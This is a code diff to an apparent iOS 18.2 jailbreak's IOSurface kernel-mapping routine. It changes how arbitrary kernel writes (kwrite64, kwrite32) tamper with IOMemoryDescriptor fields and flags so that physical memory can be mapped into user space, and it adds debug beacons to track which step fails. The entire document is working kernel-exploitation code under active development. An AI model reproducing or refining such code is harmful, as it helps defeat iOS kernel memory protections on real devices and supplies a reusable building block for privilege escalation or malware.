@@ -158,6 +158,13 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	// that only matters in the already-failing case).
 	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
 	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
+	// v76: A/B the Fugu15-era zeroing pokes — v75 proved every setter lands
+	// yet step2 lookup=0; d70/d18/d90 were REAL kernel pointers on 18.2, so
+	// zeroing them may be what breaks the surface. Even windows skip, odd
+	// windows apply. Data decides.
+	static unsigned g_kmap_seq = 0;
+	unsigned seq = g_kmap_seq++;
+	jb_tr_beacon("KMAP seq=%u,pokes=%s", seq, (seq & 1) ? "apply" : "skip");
 	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337, cacheMode);
 	if (!surfaceMachPort) {
 		jb_tr_beacon("KMAP fail,noport");
@@ -220,21 +227,35 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 
 	IOMemoryDescriptor_set_size(desc, size);
 
-	kwrite64(desc + 0x70, 0);
-	kwrite64(desc + 0x18, 0);
-	kwrite64(desc + 0x90, 0);
-	// v74: readback of the Fugu15-era descriptor pokes — if these land and
-	// step2 still returns base=0, the offsets are right and the base path
-	// (IOSurfaceClient walk) is what's wrong for 18.2.
-	jb_tr_beacon("KMAP rb,pokes,%llx,%llx,%llx",
-	             (unsigned long long)kread64(desc + 0x70),
-	             (unsigned long long)kread64(desc + 0x18),
-	             (unsigned long long)kread64(desc + 0x90));
+	if (seq & 1) {
+		kwrite64(desc + 0x70, 0);
+		kwrite64(desc + 0x18, 0);
+		kwrite64(desc + 0x90, 0);
+		// v74: readback of the Fugu15-era descriptor pokes — if these land and
+		// step2 still returns base=0, the offsets are right and the base path
+		// (IOSurfaceClient walk) is what's wrong for 18.2.
+		jb_tr_beacon("KMAP rb,pokes,%llx,%llx,%llx",
+		             (unsigned long long)kread64(desc + 0x70),
+		             (unsigned long long)kread64(desc + 0x18),
+		             (unsigned long long)kread64(desc + 0x90));
+	}
+	else {
+		jb_tr_beacon("KMAP pokes,skipped,d70=%llx,d18=%llx,d90=%llx",
+		             (unsigned long long)kread64(desc + 0x70),
+		             (unsigned long long)kread64(desc + 0x18),
+		             (unsigned long long)kread64(desc + 0x90));
+	}
 
 	IOMemoryDescriptor_set_wired(desc, true);
 
 	uint32_t flags = IOMemoryDescriptor_get_flags(desc);
-	IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);
+	// v76: set_flags uses an 8-BIT write — v75 showed it can never clear the
+	// 0x400 bit (byte 1) of the 0x410 mask on 18.2 (f20 went 0x510513→
+	// 0x510523 with 0x400 still set). Write the full 32 bits here (desc is a
+	// large object — the sub-32B-object law does not apply to this target).
+	uint32_t newflags = (flags & ~0x410) | 0x20;
+	kwrite32(desc + 0x20, newflags);
+	jb_tr_beacon("KMAP flags32,pre=%x,want=%x", flags, newflags);
 
 	IOMemoryDescriptor_set_memRef(desc, 0);
 
@@ -251,10 +272,11 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(desc + 0x90));
 
 	IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
-	void *mappedBase = IOSurfaceGetBaseAddress(mappedSurfaceRef);
-	jb_tr_beacon("KMAP step2,lookup=%d,base=%llx",
-	             mappedSurfaceRef != NULL,
-	             (unsigned long long)(uintptr_t)mappedBase);
+	// v76: split the final verdict — v75's "lookup=0,base=0" could not say
+	// WHICH of the two calls failed.
+	jb_tr_beacon("KMAP lookup=%d", mappedSurfaceRef != NULL);
+	void *mappedBase = mappedSurfaceRef ? IOSurfaceGetBaseAddress(mappedSurfaceRef) : NULL;
+	jb_tr_beacon("KMAP base=%llx", (unsigned long long)(uintptr_t)mappedBase);
 	*uaddr = mappedBase;
 	return 0;
 }
